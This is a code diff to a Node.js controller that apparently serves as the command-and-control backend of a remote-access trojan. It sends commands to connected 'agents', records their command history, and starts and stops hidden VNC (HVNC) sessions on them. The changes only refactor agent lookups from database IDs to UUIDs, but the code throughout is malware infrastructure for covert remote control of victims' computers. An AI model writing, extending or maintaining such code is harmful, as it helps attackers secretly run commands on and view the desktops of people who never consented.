@@ -65,7 +65,7 @@ exports.getAllAgents = catchAsync(async (req, res, next) => {
  * Get a single agent by ID
  */
 exports.getAgent = catchAsync(async (req, res, next) => {
-  const agent = await Client.findById(req.params.id);
+  const agent = await Client.findOne({ uuid: req.params.id });
   
   if (!agent) {
     return next(new AppError('No agent found with that ID', 404));
@@ -159,7 +159,7 @@ exports.sendCommand = catchAsync(async (req, res, next) => {
     clientConnection.send(JSON.stringify(commandPayload));
     
     // Store command in database for tracking
-    await Client.findByIdAndUpdate(agentId, {
+    await Client.findOneAndUpdate({ uuid: agentId }, {
       $push: {
         commandHistory: {
           id: commandId,
@@ -197,7 +197,7 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
   const agentId = req.params.id;
   const { quality = 'medium', fps = 15 } = req.body;
   
-  const agent = await Client.findById(agentId);
+  const agent = await Client.findOne({ uuid: agentId });
   
   if (!agent) {
     return next(new AppError('No agent found with that ID', 404));
@@ -240,7 +240,7 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
     clientConnection.send(JSON.stringify(hvncCommand));
     
     // Update agent with HVNC session info
-    await Client.findByIdAndUpdate(agentId, {
+    await Client.findOneAndUpdate({ uuid: agentId }, {
       $set: {
         hvncSession: {
           sessionId,
@@ -275,7 +275,7 @@ exports.stopHvncSession = catchAsync(async (req, res, next) => {
   const agentId = req.params.id;
   const { sessionId } = req.body;
   
-  const agent = await Client.findById(agentId);
+  const agent = await Client.findOne({ uuid: agentId });
   
   if (!agent) {
     return next(new AppError('No agent found with that ID', 404));
@@ -300,7 +300,7 @@ exports.stopHvncSession = catchAsync(async (req, res, next) => {
   }
   
   // Clear HVNC session info
-  await Client.findByIdAndUpdate(agentId, {
+  await Client.findOneAndUpdate({ uuid: agentId }, {
     $unset: { hvncSession: 1 }
   });
   
